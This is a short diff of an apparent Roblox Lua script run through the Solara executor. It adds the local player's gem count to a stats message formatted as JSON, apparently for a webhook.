@@ -21,7 +21,8 @@ end
 e = e.."\\nBest Pet: 1/"..big
 end)
 if not uuu then
-e=e.."\\n*No stats available cuz solara*"
+e=e.."\\nGems: "..game:GetService("Players").LocalPlayer.PlayerGui.Main.Left["Diamonds Desktop"].Text
+e=e.."\\n*No pet stats available cuz solara*"
 end
 msg = '{"content":"'..e..'"}'
 local response =
